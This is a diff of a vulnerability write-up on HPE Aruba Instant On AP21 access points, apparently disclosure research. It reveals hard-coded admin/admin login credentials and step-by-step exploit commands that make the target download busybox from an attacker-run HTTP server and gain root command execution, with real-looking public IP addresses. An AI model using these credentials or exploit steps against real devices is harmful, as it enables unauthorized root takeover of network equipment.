@@ -22,13 +22,10 @@ AP32
 ### 1.3 Some special information about the product
 
 My device is AP21.<br>
-The Access Points in the AP21 series are used in different scenarios than the Access Points in the AP635 series.<br>
 The AP21 series is intended for small businesses.<br>
-The firmware of the AP21 series is also different from the firmware of the AP635 series, which is more streamlined.<br>
 Access Points for the AP21 series are managed through the cloud at https://portal.instant-on.hpe.com/.<br>
 The firmware of this AP21 series is the latest, because it is synchronized through the cloud, and device users cannot update their own devices.<br>
-The latest firmware version is 3.1.0.0
-
+The latest firmware version is 3.1.0.0.<br>
 Device users can access only a simple WEB page (as shown in the following figure) to view device information, and cannot perform any management or login operations.<br>
 ![image-20250221210729587](Images/image-20250221210729587.png)
 
@@ -50,8 +47,7 @@ Some exploits tips:
 2. Overwrite the sh script file to execute system commands
 ```
 
-Vulnerability exploitation flowchart:
-
+Vulnerability exploitation flowchart:<br>
 Here is a simplified version of the road map, see the detailed process in Section 4.<br>
 ![2](Images/2.png)
 
@@ -330,9 +326,7 @@ int handle_rest_login(_DWORD *a1, ...)
 }
 ```
 
-I first followed the experience of the AP635 series with **admin/ device serial number ** to call the login api, and found that it failed.<br>
-Just when I thought my research was over, I tried calling the login api with **admin/admin** and successfully returned sid!
-
+Just when I thought my research was over, I tried calling the login api with **admin/admin** and successfully returned sid!<br>
 So we found a hard-coded login credentials vulnerability that applies to all AP21 series.<br>
 ## 4 Vulnerability exploitation
 
@@ -406,8 +400,7 @@ Combined with this information, you can eventually execute arbitrary system comm
  (hard-coded login credentials vulnerability + arbitrary administrative command execution vulnerability after login)
 
 .<br>
-The command I execute in the auto_sw_funcs file is:
-
+The command I execute in the auto_sw_funcs file is:<br>
 This command can be modified in the exploit_httpserver.py file
 
 ```
@@ -430,9 +423,8 @@ uid=0(root) gid=0(root)
 python exploit_httpserver.py --exploit_http_server_ip=10.0.4.54
 ```
 
-exploit_http_server_ip is the ip of the http server server,the value must be a server address accessible to the public network
-
-This step is to start an http server server with a slow transfer rate
+exploit_http_server_ip is the ip of the http server server,the value must be a server address accessible to the public network<br>
+This step is to start an http server server with a slow transfer rate<br>
 
 **Step 2:**  Open a new command line terminal under the exploit file and execute the following command
 
@@ -440,7 +432,7 @@ This step is to start an http server server with a slow transfer rate
 python3 -m http.server 8888
 ```
 
-This step is to start an http server server for the device to download the busybox file
+This step is to start an http server server for the device to download the busybox file<br>
 
 **Step 3:**  Open a new command line terminal under the exploit file and execute the following command
 
@@ -449,13 +441,10 @@ python exploit.py --aruba_ap_ip=10.0.4.102 --action=exploit --exploit_http_serve
 python exploit.py --aruba_ap_ip=118.163.110.217 --action=exploit --exploit_http_server_ip=123.60.137.236
 ```
 
-aruba_ap_ip indicates the ip address of the target device to be exploited
-
-exploit_http_server_ip is the ip of the http server server
-
-action defaults to exploit
-
-Wait quietly for exploit.py to finish executing, then proceed to step 4
+aruba_ap_ip indicates the ip address of the target device to be exploited<br>
+exploit_http_server_ip is the ip of the http server server<br>
+action defaults to exploit<br>
+Wait quietly for exploit.py to finish executing, then proceed to step 4<br>
 
 **Step 4:** Open a new command line terminal under the exploit file and execute the following command
 
